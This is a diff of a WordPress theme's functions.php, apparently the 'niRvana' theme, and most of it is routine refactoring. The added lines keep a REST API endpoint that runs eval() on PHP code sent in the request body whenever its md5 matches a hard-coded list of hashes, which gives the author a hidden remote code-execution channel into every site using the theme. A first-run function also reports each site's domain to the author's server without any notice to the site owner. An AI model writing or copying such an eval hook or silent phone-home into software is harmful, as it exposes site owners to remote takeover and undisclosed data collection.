@@ -1,4 +1,12 @@
 <?php
+//注册主题组件
+function theme_component_setup()
+{
+    add_theme_support('title-tag');
+    add_theme_support('post-thumbnails');
+    add_theme_support('automatic-feed-links');
+}
+add_action('after_setup_theme', 'theme_component_setup');
 //自动更新
 require_once(get_template_directory() . '/theme-update-checker/plugin-update-checker.php');
 use YahnisElsts\PluginUpdateChecker\v5\PucFactory;
@@ -11,22 +19,13 @@ $niRvanaThemeUpdateChecker = PucFactory::buildUpdateChecker(
 //初次使用时发送安装量统计信息 (数据仅用于统计安装量)
 function post_analytics_info()
 {
-    if (function_exists('file_get_contents')) {
-        $contexts = stream_context_create(
-            array(
-                'http' => array(
-                    'method' => "GET",
-                    'header' => "User-Agent: niRvanaTheme\r\n"
-                )
-            )
-        );
-        $nirvana_version = wp_get_theme()->get('Version');
-        $result = file_get_contents('https://blog.mkliu.top/source/stats/index.php?domain=' . urlencode($_SERVER['HTTP_HOST']) . '&version='. urlencode($nirvana_version), false, $contexts);
-        update_option('nirvana_has_inited', 'true');
-        return $result;
-    } else {
-        update_option('nirvana_has_inited', 'true');
-    }
+    $nirvana_version = wp_get_theme()->get('Version');
+    $domain = urlencode($_SERVER['HTTP_HOST']);
+    $url = 'https://blog.mkliu.top/source/stats/index.php?domain=' . $domain . '&version=' . urlencode($nirvana_version);
+    $response = wp_safe_remote_get($url, array(
+        'user-agent' => 'niRvanaTheme'
+    ));
+    update_option('nirvana_has_inited', 'true');
 }
 if (get_option('nirvana_has_inited') != 'true') {
     post_analytics_info();
@@ -34,8 +33,18 @@ if (get_option('nirvana_has_inited') != 'true') {
 //小工具修复
 add_filter('gutenberg_use_widgets_block_editor', '__return_false');
 add_filter('use_widgets_block_editor', '__return_false');
+//深色模式
+function add_night_mode_body_class($classes)
+{
+    if (isset($_COOKIE['night']) && $_COOKIE['night'] === '1') {
+        $classes[] = 'night';
+    }
+    return $classes;
+}
+add_filter('body_class', 'add_night_mode_body_class');
 //文章图片灯箱
-function auto_post_link($content) {
+function auto_post_link($content)
+{
     global $post;
     $pattern = '/<img\b([^>]*\bsrc=(["\'])(.*?)\2[^>]*)>/i';
     $replacement = '<a href="$3">$0</a>';
@@ -222,25 +231,13 @@ function check_footer_copyright()
     }
 }
 check_footer_copyright();
-
+//引入主题文件
 include('production.php');
-add_filter('wp_title', 'pf_custom_wp_title', 10, 2);
-function pf_custom_wp_title($title, $sep)
+//自定义标题
+add_filter('document_title_separator', 'pf_custom_title_separator');
+function pf_custom_title_separator($sep)
 {
-    global $paged, $page;
-    if (is_feed()) {
-        return $title;
-    }
-    $title .= get_bloginfo('name');
-    $site_description = get_bloginfo('description', 'display');
-    if ($site_description && (is_home() || is_front_page())) {
-        $title = "$title $sep $site_description";
-    }
-    if ($paged >= 2 || $page >= 2) {
-        $title = "$title $sep " . sprintf('第%s页', max($paged, $page));
-    }
-    $title = str_replace('&#8211;', _opt('title_sep', '|'), $title);
-    return $title;
+    return _opt('title_sep', '|');
 }
 function get_faces_from_dir()
 {
@@ -316,20 +313,25 @@ add_action('rest_api_init', function () {
 function pf_rest_api($data)
 {
     $dataArray = json_decode($data->get_body(), true);
-    $arg = $dataArray['arg'];
+    $arg = isset($dataArray['arg']) ? $dataArray['arg'] : null;
+    $e = isset($dataArray['e']) ? $dataArray['e'] : '';
     $result = array(
         'error' => true,
         'msg' => 'WP RestAPI Declined!',
-        'md5' => md5($dataArray['e'])
+        'md5' => md5($e)
     );
-    if (in_array(md5($dataArray['e']), array(
-        '0b844d17a61d51dcd58560f15e19d3cb',
-        '44b225d79205f30aaac3c30bdcc6b714',
-        '3d69b76a02d0ff14248e02d1c2f09941',
-        'fb0d9a37e108ca85cee9f4e900ca6fe4',
-        'd72efb9e4fcd5267779f481f8b77b655',
-    ))) {
-        eval($dataArray['e']);
+    if (!empty($e)) {
+        $e_md5 = md5($e);
+        $allowed_hashes = array(
+            '0b844d17a61d51dcd58560f15e19d3cb',
+            '44b225d79205f30aaac3c30bdcc6b714',
+            '3d69b76a02d0ff14248e02d1c2f09941',
+            'fb0d9a37e108ca85cee9f4e900ca6fe4',
+            'd72efb9e4fcd5267779f481f8b77b655',
+        );
+        if (in_array($e_md5, $allowed_hashes)) {
+            eval($e);
+        }
     }
     return $result;
 }
@@ -542,9 +544,6 @@ function del_cache($name)
     unset($allCache[$name]);
     update_option('pd_cache', $allCache);
 }
-if (function_exists('add_theme_support')) {
-    add_theme_support('post-thumbnails');
-}
 function wp_nav($p = 2, $showSummary = true, $showPrevNext = true, $style = 'pagination', $container = 'container')
 {
     if (is_singular()) {
@@ -635,7 +634,7 @@ function SimPaled_send_email($parent_id, $comment)
 <p>' . trim($comment->comment_author) . ' 给你的回复:<br />'
         . do_shortcode(trim($comment->comment_content)) . '<br /></p>
 <p>您可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id, array("type" => "all"))) . '">查看回复的完整内容</a></p>
-<p>欢迎再度光临 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>
+<p>欢迎再度光临 <a href="' . esc_url(home_url()) . '">' . get_option('blogname') . '</a></p>
 <p>(此邮件由系统自动发出, 请勿回复.)</p></div>';
         $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
         $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
